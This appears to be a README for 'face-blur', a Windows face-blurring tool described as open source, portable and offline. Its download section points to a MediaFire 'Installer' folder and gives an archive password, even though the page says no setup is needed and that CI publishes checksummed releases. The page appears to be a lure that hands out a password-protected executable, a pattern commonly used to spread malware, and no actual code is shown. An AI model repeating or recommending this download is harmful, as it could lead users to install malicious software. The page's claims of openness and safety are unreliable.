# face-blur

🌫️ Free, open-source face anonymizer for Windows — blur or pixelate faces in photos and videos locally. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Photos and videos** — faces detected and blurred frame by frame in clips, not just stills
- ✅ **Tracking between frames** — a blur box follows a face through motion instead of flickering off
- ✅ **Blur or pixelate** — strength dial per mode, with a solid-cover option for strict cases
- ✅ **Keep-list** — mark the presenter's face to stay sharp while everyone else is covered
- ✅ **Batch photo folders** — a thousand event photos anonymized unattended
- ✅ **Copy-first workflow** — originals untouched; outputs written to a separate folder with a manifest
- ✅ **100 MB self-contained exe** — runtime and detection model bundled, portable, offline, MIT

## Why face-blur

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **face-blur** | YouTube blur tool | Manual editing | Cloud anonymizers |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Built-in upload | Subscription | Paid tiers |
| Open source | **Yes** | No | No | No
| Works on local files | **Yes** | Upload required | Yes | Upload
| Batch photo folders | **Yes** | No | No | Partial
| Keep-list for target faces | **Yes** | Partial | Manual | No
| Portable, no install | **Yes, 100 MB** | Browser | Installer | Browser

## FAQ

**blur faces in videos and photos offline on Windows?**

Editors charge subscriptions, web tools want the footage uploaded and YouTube's blur only exists after posting. face-blur detects and tracks faces locally, keeps chosen faces sharp and covers the rest in batch. It is a 100 MB portable exe, MIT, offline, originals untouched.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark anonymizer (#121417, zinc #71717A): video preview with tracked blur boxes on three faces, keep-list chip on the presenter, strength dial at 0.8.
2. Photo batch: 240 event photos with detected face counts, blur mode tiles, progress at 61 percent, manifest checkbox enabled.
3. Track review: timeline strip with follow segments per face, two manual keyframe dots added, export button, output folder chip.

## Download

| Source | Link |
|---|---|
| 💾 **Installer face-blur** | [Installer face-blur](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).